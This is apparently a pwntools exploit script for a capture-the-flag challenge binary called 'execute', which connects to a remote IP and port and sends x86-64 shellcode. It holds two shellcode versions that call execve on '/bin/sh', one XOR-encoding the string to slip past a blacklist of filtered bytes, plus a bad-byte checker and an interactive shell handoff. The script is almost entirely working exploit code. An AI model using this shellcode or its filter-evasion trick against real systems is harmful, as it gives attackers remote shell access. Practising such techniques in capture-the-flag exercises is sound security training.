from pwn import *

exe = './execute'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'

# sh = process(exe)
sh = remote('94.237.54.192', 41091)

blacklist = b"\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67"
        
shellcode = '''    
    mov rdi, 0xff978cd091969dd0
    xor rdi, 0xffffffffffffffff 

    push rdi
    mov rdi, rsp     
    push rax    

    push 0x0 
    pop rsi
    push 0x0
    pop rdx

    push 0x3a
    pop rax
    add al, 0x1
    syscall
'''

shellcode = '''
    mov rdi, 0x0068732f6e69622f

    push rdi
    mov rdi, rsp

    xor rsi, rsi
    xor rdx, rdx

    mov rax, 59
    syscall
'''

sc = asm(shellcode)
for byte in sc:
    if byte in blacklist:
        print(f'BAD BYTE --> 0x{byte:02x}')
        print(f'ASCII --> {chr(byte)}')

sh.sendline(sc)
sh.interactive()
